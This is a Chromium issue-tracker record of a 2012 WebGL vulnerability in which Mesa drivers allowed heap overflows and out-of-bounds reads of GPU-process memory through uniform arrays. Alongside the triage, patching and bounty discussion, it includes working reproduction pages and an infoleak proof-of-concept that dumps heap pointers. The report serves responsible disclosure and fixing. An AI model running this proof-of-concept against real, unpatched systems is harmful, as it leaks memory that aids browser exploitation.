# Security: heap buffer overflow in gpu process with webgl

| Field | Value |
|-------|-------|
| **Issue ID** | [40065891](https://issues.chromium.org/issues/40065891) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Blink>WebGL |
| **Platforms** | Linux, ChromeOS |
| **Reporter** | mi...@gmail.com |
| **Assignee** | ma...@chromium.org |
| **Created** | 2012-08-29 |
| **Bounty** | $3,500.00 |

## Description

**VULNERABILITY DETAILS**  

heap buffer overflow in gpu process with webgl

**VERSION**  

Chrome Version: dev  

Operating System: 64bit linux

**REPRODUCTION CASE**

<html>
<head>
<script id="vshader" type="x-shader/x-vertex">
attribute vec4 vPosition;
void main()
{
gl\_Position = vPosition;
}
</script>
```
<script id="fshader" type="x-shader/x-fragment">  
  precision mediump float;  
  uniform float color[3];  
  void main()  
  {  
    gl_FragColor = vec4(color[0], 0, 0, 0);  
  }  
</script>  
<script>  
  function shader(gl, program, shaderType, shaderId) {  
    var shaderSource = document.getElementById(shaderId).text  
    var shader = gl.createShader(shaderType);  
    gl.shaderSource(shader, shaderSource);  
    gl.compileShader(shader);  
    gl.attachShader(program, shader)  
  }  

  function loadProgram(gl) {  
    var program = gl.createProgram();  
    shader(gl, program, gl.VERTEX_SHADER, "vshader")  
    shader(gl, program, gl.FRAGMENT_SHADER, "fshader")  
    gl.linkProgram(program);  
    return program;  
  }  

  var gl = document.createElement('canvas').getContext('experimental-webgl')  
  var program = loadProgram(gl)  

  var elemLoc = gl.getUniformLocation(program, "color[2]");  
  var value = gl.getUniform(program, elemLoc);  
</script>  

```
 </head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: gpu + asan  

Crash State:

==21671== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffe06962b8 at pc 0x55555f2a4226 bp 0x7fffffff7b20 sp 0x7fffffff78e8  

WRITE of size 1 at 0x7fffe06962b8 thread T0  

#0 0x55555f2a4225 in \_\_interceptor\_memcpy ??:0  

#1 0x7fffe967640b in ?? ??:0  

0x7fffe06962b8 is located 4 bytes to the right of 52-byte region [0x7fffe0696280,0x7fffe06962b4)  

allocated by thread T0 here:  

#0 0x55555f2a78e1 in \_\_interceptor\_calloc ??:0  

#1 0x7fffe74936f7 in ?? ??:0

## Attachments

- [gllll.txt](attachments/gllll.txt) (text/plain; charset=us-ascii, 1.5 KB)
- [gllll.html](attachments/gllll.html) (text/html; charset=us-ascii, 1.2 KB)
- [zl.html](attachments/zl.html) (text/html; charset=us-ascii, 1.7 KB)
- [zl.html](attachments/zl_53325663.html) (text/html; charset=us-ascii, 2.3 KB)

## Timeline

### ts...@chromium.org (2012-08-29)

uploaded to https://cluster-fuzz.appspot.com/testcase?key=101836211

### ts...@chromium.org (2012-08-29)

DNR on my linux asan box, so hard to determine secimacts.

### in...@chromium.org (2012-09-05)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-09-06)

[Empty comment from Monorail migration]

### zm...@chromium.org (2012-09-06)

This one looks like a driver optimization bug to me.  The color[1] and color[2] in the frag shader is never used, so opted out by the driver.  Then later WebGL tries to query color[2], which due to some driver bug, caused the crash.

Just my educated guess.

Gregg, what do you think?  If that's the case, is there a way we can work around this driver bug in command buffer?

### gm...@chromium.org (2012-09-06)

I'm guessing that's the bug as well. There was a known bug like this in all NVidia drivers prior to Nov 2010 :-(

I don't really know of any easy way to work around it. Off the top of my head

1) Blacklist the driver
2) Re-write the shader to use all values
3) Re-write the shader so the array sizes matches the usage and alias locations so from the client side it appears as though it's an array. (that would be a serious ton of work)

Maybe someone has other ideas?

### gm...@chromium.org (2012-09-06)

4) We could probably fail the shader in the validator with "error: not possible to access all array elements"

That is something we could check and I'd guess other browser vendors would be happy to implement. It be more future proof that blacklisting drivers after we discover they have this issue.


### sc...@gmail.com (2012-09-06)

@miaubiz: sorry to keep asking, any chance you could state which GPU driver is in use for all of these reports?

@zmo @gman: the good news here is that if it's (another) Mesa driver bug, we've got a fast path to getting it patched in Mesa (and the Chrome OS image) on account of one of the Mesa guys working here and being on the ball.

@jorgelo: any chance you can try this on Chrome OS ?

### mi...@gmail.com (2012-09-06)

@scarybeasts: llvmpipe/swrast/radeon mostly.

intel gpu process crashes on start for me atm, so I can't try these on there. :|

### sc...@gmail.com (2012-09-06)

@miaubiz: thanks for the details. Can you give more details? Hehehe!

When you say "llvmpipe/swrast/radeon", do you mean that you see the same crash for each of these?

Also, when you say "Radeon", do you mean ATI flgrx drivers or Mesa drivers?

### mi...@gmail.com (2012-09-06)

is there a command I can run and paste the results here? :D

I have a box that was a radeon hd6450 on it, no fglrx, just radeon driver, it's ubuntu12.04, without a xorg.conf

03:00.0 VGA compatible controller: Advanced Micro Devices [AMD] nee ATI Caicos [Radeon HD 6450]

I get the crashes both under Xvfb, and going to the box and doing DISPLAY=:0 chromium-browser --skip-gpu-data-loading

for the first two bugs I was also able to reproduce on intel driver, but no intel no longer works at all. :|

client glx vendor string: Mesa Project and SGI
client glx version string: 1.4
OpenGL vendor string: VMware, Inc.
OpenGL renderer string: Gallium 0.4 on llvmpipe (LLVM 0x300)
OpenGL version string: 2.1 Mesa 8.0.2
OpenGL shading language version string: 1.20

### sc...@gmail.com (2012-09-06)

Does --disable-seccomp-filter-sandbox or --disable-gpu-sandbox make Intel work again? (hopefully I didn't typo those flags)

For the radeon driver, just to confirm, the "OpenGL version string" is also Mesa based right?

### mi...@gmail.com (2012-09-06)

either one works. sweet.

here's this bug on intel:

==15461== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffe12f91b8 at pc 0x55555f2a4226 bp 0x7fffffff7aa0 sp 0x7fffffff7868
WRITE of size 1 at 0x7fffe12f91b8 thread T0
    #0 0x55555f2a4225 (/home/clooney/fuzz/asan/asan-linux-release-153873/asan-release+0x9d50225)
    #1 0x7fffe9b3640b (/usr/lib/x86_64-linux-gnu/dri/libdricore.so+0x1bb40b)
0x7fffe12f91b8 is located 4 bytes to the right of 52-byte region [0x7fffe12f9180,0x7fffe12f91b4)
allocated by thread T0 here:
    #0 0x55555f2a78e1 (/home/clooney/fuzz/asan/asan-linux-release-153873/asan-release+0x9d538e1)
    #1 0x7fffe96836f7 (/usr/lib/x86_64-linux-gnu/dri/libglsl.so+0x3a6f7)

OpenGL vendor string: Tungsten Graphics, Inc
OpenGL renderer string: Mesa DRI Intel(R) Ivybridge Desktop 
OpenGL version string: 2.1 Mesa 8.0.2
OpenGL shading language version string: 1.30


### sc...@gmail.com (2012-09-06)

Jorge, any chance you could confirm and then get our Mesa friend to work his magic?

Hope you don't mind me assigning to you; I'm doing so because:
1) You're awesome
and
2) The impact is most severe on Chrome OS at this time, I'd say.


### zm...@chromium.org (2012-09-06)

Gregg, command buffer tracks that all the used uniforms, right?  In that case, can we detect a uniform is not used, and when the location is queries, simply return null?  And maybe we can update the webgl spec to make it a requirement?

### jo...@chromium.org (2012-09-06)

Does not repro on ASan-less Chrome OS, but we already knew that. Will try ASan on my Linux laptop with Intel graphics.

### [Deleted User] (2012-09-06)

[Empty comment from Monorail migration]

### gm...@chromium.org (2012-09-07)

@zmo, the command  buffer does not have enough info to prevent this bug. 

The command buffer is already validating all the uniforms and locations. It's not currently possible for a client app to set or access a uniform outside the range of valid uniforms. In other words, if you declare a uniform of

  uniform vec4 foo[4];

You can get valid locations for "foo[0]", "foo[1]", "foo[2]", and "foo[3]".  
"foo[4]" will return -1 (the location does not exist value)

Calling glUniformXXX the command buffer will validate the location and not actually call the driver if it's invalid, or the type is incorrect for the uniform. It will also truncate calls that are too long. So if you do

GLint loc = glGetUniformLocation(program, "foo[2]");
GLint num_vec4s = 20;
glUniform4fv(loc, num_vec4s, &array_of_20_vec4s);

it will truncate num_vec4s to 2 since from "foo[2]" there are only two valid uniforms

In this case though the user asked just asked for the location of "foo[3]" and then set it which is totally valid.

The bug is likely in the driver.  There was already a test for this in the WebGL conformance tests for the NVidia bug but unfortunately passing the test doesn't mean there's no bug. Since the bug just trashes memory there's no guarantee it will crash the driver.

I added a new test to try to make it more likely to crash something if the driver is buggy

https://www.khronos.org/registry/webgl/sdk/tests/conformance/uniforms/gl-uniform-arrays.html

It creates a shader with the largest possible uniform array and only uses the first or last uniform and tries to set all of them. That will trash more memory. Still no guarantee though.




### gm...@chromium.org (2012-09-07)

jorgelo,

This page 
https://www.khronos.org/registry/webgl/sdk/tests/conformance/uniforms/gl-uniform-arrays.html

fails most tests in osmesa but passes on nvidia on linux. That suggests bugs in mesa.

### jo...@chromium.org (2012-09-07)

It also passes on a Chrome OS device with Intel graphics, which is using Mesa as well =/

### gm...@chromium.org (2012-09-07)

Just to be clear, when I say "osmesa" I mean the "osmesa" checked in to src/third_party/osmesa" which I'm assuming is different from the mesa you're referring to?

### jo...@chromium.org (2012-09-07)

OK, --use-gl=osmesa makes the tests fail on Chrome OS as well, which is expected.

According to c#13, this should repro on Intel. I'll get an ASan build on my laptop.

### ma...@chromium.org (2012-09-12)

so I was trying this, and it doesn't repro on intel i965 or llvmpipe. I'll try on i915 next, but I think it probably got fixed in mesa.

Since Chrome just happens to have a very old mesa, you can repro with osmesa.

### mi...@gmail.com (2012-09-12)

I have i965

### ma...@chromium.org (2012-09-12)

Which version of mesa do you have on i965?

### jo...@chromium.org (2012-09-12)

marcheu: are you using an ASan build?

### mi...@gmail.com (2012-09-12)

@marcheu: OpenGL version string: 3.0 Mesa 8.0.2

### ma...@chromium.org (2012-09-12)

@26: I'm not using an Asan build, but my understanding is that I should still be able to see a corruption, a crash, or a failed test.

@27: On Chrome OS we run some flavour of 8.1, maybe 8.0 has a bug which 8.1 doesn't?

### jo...@chromium.org (2012-09-12)

From c#18: "The bug is likely in the driver.  There was already a test for this in the WebGL conformance tests for the NVidia bug but unfortunately passing the test doesn't mean there's no bug. Since the bug just trashes memory there's no guarantee it will crash the driver."

I did not see test fails or corruption with i965 either on CrOS.

### ma...@chromium.org (2012-09-12)

Just tried running the gpu process under valgrind on i965, and I don't repro either.

### ma...@chromium.org (2012-09-12)

[Empty comment from Monorail migration]

### ma...@chromium.org (2012-09-12)

So here is what I tried:
- i915g, i965, llvmpipe on Chrome OS 23
- llvmpipe on Linux with Chrome 22

I tried all of them with and without valgrind, no repro. So I'm going to stop digging for now, please ping me if you have a way to repro.

### mi...@gmail.com (2012-09-12)

creating large uniforms and reading back the values show stuff like:

55555ba98fa0 
55555bb16180 
55555a8115b0 
7ffeebeabf30 
7ffeebeb40d8 
55555b9fdb70 
55555bb161b0 
55555bb12370 
55555bb10a80 
55555b527380 
7ffeebeabf30 

    <script id="fshader" type="x-shader/x-fragment">
      precision mediump float;
      uniform ivec4 color0[65535];
      uniform ivec4 color1[65535];
      uniform ivec4 color2[65535];
      uniform ivec4 color3[65535];
      void main()
      {
        gl_FragColor = vec4(color0[0][0], color1[0][0], color2[0][0], color3[0][0]);
      }
    </script>

   for (var j=0; j<4; j++) {
      for (var i=0; i<65535; i++) {
        var elemLoc = gl.getUniformLocation(program, "color"+j+"["+i+"]");
        var value = gl.getUniform(program, elemLoc);
        var value2 = value[1]*Math.pow(2,32)+value[0]
        var value3 = value[3]*Math.pow(2,32)+value[2]
        console.log(value2.toString(16))
        console.log(value3.toString(16))
      }
      }
   
...




### gm...@chromium.org (2012-09-12)

That shader should fail to validate as it's using more than the maximum number of uniforms.

I see that's true by checking the JS console

WebGL: INVALID_OPERATION: useProgram: program not valid zl.html:1
WebGL: INVALID_OPERATION: getUniformLocation: program not linked zl.html:1
WebGL: INVALID_OPERATION: getUniform: no uniformlocation or not valid for this program 

### ma...@chromium.org (2012-09-12)

Oh I should add that:
- mesa 8.1 (i915g, i965, llvmpipe) on Chrome OS 23
- mesa 8.0 (llvmpipe) on Linux with Chrome 22
is what I tried, and couldn't reproduce with.

### sc...@gmail.com (2012-09-14)

Aieeee. Definitely a problem. The repro in https://crbug.com/chromium/145525#c33 works verbatim on my laptop machine:

GL_RENDERER	Mesa DRI Intel(R) Sandybridge Mobile
GL_VERSION	3.0 Mesa 8.0.2
Version 23.0.1262.0 dev

I see pointer values into the Chrome executable, pointers that correspond to my heap location, pointers into libglsl.so etc. etc.

It's a lovely repro / demo, miaubiz.

### sc...@gmail.com (2012-09-14)

And also on my Chromebook. Intel Sandbridge, 3.0 Mesa 8.1-devel (git-c6c8a05)

I don't have any non-Intel machines to hand so I can't see if it's Intel specific or also affects other Mesa drivers etc.

Is it Mesa's responsibility to validate this or should ANGLE have caught it? Ken?

### sc...@gmail.com (2012-09-14)

@marcheu, reproduces verbatim for me on real Intel hardware (two different machines, one Lenovo laptop, one Chromebook)

Any chance you can try again to repro with zl.html ?

### sc...@gmail.com (2012-09-14)

I also can't reproduce https://crbug.com/chromium/145525#c0 under valgrind FWIW. But the repro in https://crbug.com/chromium/145525#c33 is golden.

@miaubiz: one last question for the evening, is it possible to take and modify the repro in https://crbug.com/chromium/145525#c33 to write the OOB values as well as read them?

### mi...@gmail.com (2012-09-14)

@scarybeasts: I can't write there atleast with gl.uniform2iv(elemLoc, [0x41414141, 0x12345678]);

it causes the uniform location to become 'valid' . reading from it (and all locations below it) afterwards reads zero

I can also read the values 0x4000 and 0x0008 on my mac from the invalid uniformlocations, but nothing interesting. 

### jo...@chromium.org (2012-09-14)

How long does the repro take to run? I see it has a 65536-iteration-long loop, but both on lumpy and on link the zl.html tab seems to hang for minutes, and I see no console output.

### jo...@chromium.org (2012-09-14)

OK I needed to *first* open the console on a blank renderer and *then* open the zl.html file. We definitely have OOB reads.

### jo...@chromium.org (2012-09-14)

OK, Ken and I dug some more into this. Attached is a modified repro that checks for errors in shader compilation and program linking.

On my Nvidia desktop, I get:
Shader compilation succeeded zl.html:31
Shader compilation succeeded zl.html:31
Program link failed zl.html:42
MAX_FRAGMENT_UNIFORM_VECTORS = 512 zl.html:51
WebGL: INVALID_OPERATION: useProgram: program not valid zl.html:1
GL error = 1282 zl.html:58
WebGL: INVALID_OPERATION: getUniformLocation: program not linked zl.html:1
WebGL: INVALID_OPERATION: getUniform: no uniformlocation or not valid for this program zl.html:1
Uncaught TypeError: Cannot read property '1' of null zl.html:66
WebGL: CONTEXT_LOST_WEBGL: loseContext: context lost 

Which makes sense, since MAX_FRAGMENT_UNIFORM_VECTORS is clearly smaller than 65535. 

However, on my Intel Chromebook, I get:
Shader compilation succeeded zl1.html:31
Shader compilation succeeded zl1.html:31
Program link succeeded zl1.html:44
MAX_FRAGMENT_UNIFORM_VECTORS = 4096 

Which is clearly wrong, since 4096 is still smaller than 65535. So it does indeed look like a bug in Mesa.

Stéphane, does this help?

### jo...@chromium.org (2012-09-14)

Attachment!

### kb...@chromium.org (2012-09-14)

@cevans: per comment above, this is definitely a bug in Mesa. The shader properly fails compilation with NVIDIA's OpenGL implementation.


### kb...@chromium.org (2012-09-21)

This bug is serious and seems to be present in top of tree Mesa -- on Chrome OS, the shader compiles successfully, and random memory is read. Do we need to blacklist all current versions of Mesa? I am inclined to say that this is necessary.


### kb...@chromium.org (2012-09-21)

Additionally: I am not sure how we would catch this problem in the shader validator. We would need to estimate how many uniform vectors are consumed by the vertex and fragment shaders, and fail compilation if they were getting close to the GL's maximum value, before passing the shader down to the GL for real compilation. Our estimate of how the uniforms are laid out, and which ones are live, would not match that in the underlying GL, so our estimate would be very conservative. For this reason it would be preferable to fix this in Mesa.


### sc...@gmail.com (2012-09-21)

If we blacklist all of Mesa, ChromeOS has no GPU ;-)

Yes, it's serious. Adding @piman in case he knows of anyone who can resolve this promptly.

I'm inclined to persue the "get it fixed quickly" route rather than the "blacklist Mesa" route but your call Ken.

### ma...@chromium.org (2012-09-21)

Well, Chrome OS ignores the blacklists, so we're good.

I can fix it in mesa, but I have a ton of other items on my plate for Chrome OS, so I probably won't find time for it soon. Maybe this week end.

### pi...@chromium.org (2012-09-21)

+backer: is there anyone on your team that could take a look?

### kb...@chromium.org (2012-09-21)

I've emailed Ian Romanick at Intel asking him whether I can CC: him on this bug and whether he might be able to work on fixing it in Mesa.


### sc...@gmail.com (2012-09-25)

@miaubiz: well, we haven't quite managed to fix this one yet but we understand it well enough to have covered it at our most recent reward discussion.

In a vivid example that infoleaks are an unwanted headache, we're rewarding a base of $500 for the OOB read and a top-up bonus of $3000 for the proof of exploitability :)

Total $3500

### ba...@chromium.org (2012-09-26)

[Empty comment from Monorail migration]

### jo...@chromium.org (2012-10-02)

kbr: did the person at Intel reply to you?

### kb...@chromium.org (2012-10-02)

Sorry, yes, but indicating that he was frustrated with these private bugs and wanted them filed upstream in Mesa. I haven't had a chance to do that, and it wasn't clear from his email whether he would want me to add him to the CC: list here.


### sc...@gmail.com (2012-10-02)

Does the upstream Mesa bug tracker support any level of privacy / discretion?

### jo...@chromium.org (2012-10-02)

scarybeasts: it's a Bugzilla system, so I guess it should be possible?

### gm...@chromium.org (2012-10-03)

I don't see why the shader validator can't at least catch some subset of these errors.

If you declare

   uniform vec4 someArray[MAX_UNIFORM_VECTORS + 1];

That seems like it should just fail outright, period regardless of whether or not the GLSL compiler can figure out you didn't access the entire array and optimize.

That doesn't seem like an unacceptable restriction

### gm...@chromium.org (2012-10-03)

Another reference. The ES GLSL spec specifies a uniform packing algorithm in Appendix A, section 7 page 111

Although an impl is allowed to pack more efficiently, the algo specified in the spec does not allow arrays to be optimized. In the interest of inter-op it would see like a good idea for the validator to enforce this.

### kb...@chromium.org (2012-10-03)

Agree with you that there are some cases that should obviously fail. The algorithm in Appendix A however only specifies minimum requirements. Just because that algorithm doesn't allow optimization of arrays and just because a shader fails variable packing according to that algorithm doesn't mean that it must fail on all implementations.

What kind of check do you think could be added to the spec and validator? Packing of arrays according to the Appendix A algorithm, and ignoring other variables, must succeed? What about shaders which come really close to the limits with arrays, and then use a couple of non-array variables to push an implementation over the limit? Such a shader would pass the validator but could still potentially trigger a bug like this one.


### kb...@chromium.org (2012-10-04)

[Empty comment from Monorail migration]

### gm...@chromium.org (2012-10-04)

I'm suggesting that any shader that doesn't fit those rules fails (all the rules, not just arrays). I'm not sure how that's a problem because since WebGL is supposed to be portable, any shader that uses more than MAX_UNIFORM_VECTORS could fail on any driver. Just because it succeeds on some drivers doesn't seem like a plus to me.

It just seems proactive. The example pasted above of 262144 uniforms seems particularly obvious it should fail. It doesn't seem like letting developers count on driver optimizing away an array like that is particularly a good use case.




### kb...@chromium.org (2012-10-04)

[Empty comment from Monorail migration]

### kb...@chromium.org (2012-10-04)

After thinking about this more I agree with you. Few thoughts:

  - It seems that this approach is the only feasible one for working around driver bugs such as that in Mesa. I agree with you that it's absolutely necessary to implement it as an option in ANGLE's shader validator.

  - Rather than using the hardwired number of registers listed in Appendix A, the values of querying the parameters GL_MAX_VERTEX_UNIFORM_VECTORS, GL_MAX_FRAGMENT_UNIFORM_VECTORS, and GL_MAX_VARYING_VECTORS should be passed in to the validator's packing algorithm.

  - We should test the enforcement of this algorithm with high end WebGL content to see whether it breaks anything. I'm concerned that the conservative estimate will prevent valid content from running. If it does, then I think it should be enforced only on known buggy drivers.


### gm...@chromium.org (2012-10-06)

Just thinking out loud here but I could try to reject these in the command buffer code.

After a glLinkProgram I read all the uniform locations. If applying the packing algo there are more than GL_MAX_UNIFORM_??? I could claim the link failed. That's not as good as doing in ANGLE though.

### kb...@chromium.org (2012-10-08)

That would work. I'm a little concerned that memory stomps might occur simply by having the GLSL compiler attempt to compile these obviously invalid shaders.


### fj...@chromium.org (2012-10-09)

I've been looking at Mesa.  There is no checking in GetUniformLocation or GetUniform so there is a potential to read outside the array.  There is a check on the index before setting a uniform array element so it shouldn't be possible to write outside the array, but for some reason I'm still tracking down, the array size it checks against sometimes seems wrong so the check doesn't work as I think was intended.  I've only seen it too low so far (disallowing writes to the array which should work), not too high (allowing writes outside the array) but as I say I'm still looking at it.  If I can ensure there's always a correct array size to work with then I just need to add an index check on read and we're done.

### kb...@chromium.org (2012-10-09)

[Empty comment from Monorail migration]

### gm...@chromium.org (2012-10-09)

Ugh, so the problem with doing this after glLinkProgram is that the program would successfully link, which means it replaces the previous program but then if I check and it fails when I count uniforms and so I report failure, I can't restore the previous program. (unless I indirect programs which would be huge amount of work).

Maybe it doesn't matter. The situations where that matters are probably super rare but it does make it not spec compatible.

We could turn this on just for Mesa though I'd prefer whatever solution we use we use everywhere. 

### zm...@chromium.org (2012-10-09)

Then I think doing this check and fail at Angle shader translation stage is better.

### sc...@gmail.com (2012-10-11)

Paid as part of $10633.70 batch

### fj...@chromium.org (2012-10-30)

Here's a patch for mesa to add array index bounds checking to glGetUniformLocation and glGetUniform*.  I don't know how the webgl layer works, but if it wants to rely on mesa to know which array elements exist, it should be able to now.  At the very least there should be no chance now of glGetUniform* reading any memory it shouldn't.
glUniform* already had checking so it would not write anywhere it shouldn't.
https://gerrit.chromium.org/gerrit/36859

### ke...@google.com (2012-11-05)

This needs to be retargeted, 22's cooked.

### fj...@chromium.org (2012-11-08)

Merge into 23:
https://gerrit.chromium.org/gerrit/37562

### in...@chromium.org (2012-11-08)

[Empty comment from Monorail migration]

### mi...@gmail.com (2012-11-09)

is the fix only for chromeos or will it be made for regular chrome aswell?

### sc...@gmail.com (2012-11-09)

@miaubiz: thanks for checking in. The way we're currently handling many of the Mesa issues is to patch them in Chrome OS (because it is our responsibility to do so) and letting Linux distributions patch their own Mesa libs :)

In fact, I just took a Mesa update to my Ubuntu 12.04 a couple of days ago. It's a fix for your older issue (the buffer overflow) so hopefully Ubuntu will continue to catch up and patch this OOB read too!

### sc...@gmail.com (2012-11-12)

[Empty comment from Monorail migration]

### jo...@chromium.org (2012-11-13)

[Empty comment from Monorail migration]

### jo...@chromium.org (2012-11-13)

[Empty comment from Monorail migration]

### ja...@gmail.com (2012-11-30)

Mesa's bug tracker at freedesktop.org allows filing security bugs since today: check "Mesa security group" under Advanced Fields. Please file!

### fj...@chromium.org (2012-11-30)

I have already sent a patch upstream and will keep on it until it's accepted.

### ja...@gmail.com (2012-11-30)

A little warning though: the current default assignee for mesa bugs is mesa-dev and so by default, even secure bugs get echoed on that public mailing list. So if you file a secure bug, make sure to set a specific mesa developer as assignee.

### si...@gmail.com (2012-12-04)

Is this an open upstream mesa bug, can someone provide me with a bug number?

### fj...@chromium.org (2012-12-04)

I did not file a bug, I just sent a patch to the mailing list.  The first reviewer asked for a test case to be added to the piglit test suite, which I provided.  I'm still going back and forth with reviewers on that.  Progress is slow because it seems anyone outside a small circle of developers is mostly ignored on the mailing list.

### ja...@gmail.com (2012-12-04)

That is why I thought it worth the effort to get Mesa's bugzilla to allow security bugs ;-)

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### kr...@chromium.org (2013-01-16)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-10)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/145525?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40065891)*
